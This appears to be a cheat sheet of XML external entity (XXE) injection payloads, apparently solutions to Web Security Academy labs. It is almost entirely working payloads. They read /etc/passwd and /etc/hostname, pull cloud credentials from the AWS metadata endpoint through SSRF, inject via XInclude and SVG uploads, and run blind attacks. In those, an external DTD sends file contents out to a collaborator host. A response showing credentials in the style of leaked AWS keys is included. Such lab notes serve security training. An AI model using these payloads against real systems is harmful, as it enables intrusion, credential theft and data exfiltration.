# XML external entity (XXE) injection

## Exploiting XXE using external entities to retrieve files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Exploiting XXE to perform SSRF attacks
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Response:
```
HTTP/1.1 400 Bad Request
Content-Type: application/json
Connection: close
Content-Length: 546

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2019-12-04T10:39:48.174417Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "D7yHyaS5hANcoG9TRauJ",
  "SecretAccessKey" : "sjh5r5gtjQve7lX8O54ot3MdPlumGIIjiMseJ0C7",
  "Token" : "E6wskTuxF97EZqvoUbf9MiJigRSLPFzZIdIGXcE42TvUcNbDoPOWS4hORxQyw6AbJHVc5oKKuzA7jZqs4RBUH82sPaSbWAC0irnK38e7HPGrEa8LtXtPGhEbYn162TfasBvs1H7wOrDuV1iYykMb0vZEh0Oe6aqk0u4kbc2XmDRdUUmknShBqq4AVttL69qtTjsRQ4gzcbgMOC5rhDVHx01bTd9dHrt1XEAVxzBJY3Stj40s0nkAOyIvWCoKF68T",
  "Expiration" : "2025-12-02T10:39:48.174417Z"
}"
```

### Exploiting XInclude to retrieve files
Body is not XML itself but one of values is injected into XML context.. (for example SOAP)
```
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```

### Exploiting XXE via image file upload
SVG file
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg> 
```

Read value from avatar image

## Blind XXE vulnerabilities

### Blind XXE with out-of-band interaction
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction via XML parameter entities
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net"> %xxe; ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Exploiting blind XXE to exfiltrate data using a malicious external DTD
Exploit hosted at https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://suq7(...).burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate; 
```

Modified HTTP request body
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit"> %xxe;]>
```

Burp Collaborator interaction: `GET /?x=64417c38891c HTTP/1.1`

### Exploiting blind XXE to retrieve data via error messages
Exploit hosted at https://ac381fd11f83c251800a4f4901dc00aa.web-security-academy.net/
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Modified HTTP request body
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac381fd11f83c251800a4f4901dc00aa.web-security-academy.net/exploit"> %xxe;]>
```

### Exploiting XXE to retrieve data by repurposing a local DTD
Verify the file exists
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Modified HTTP request body
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
```
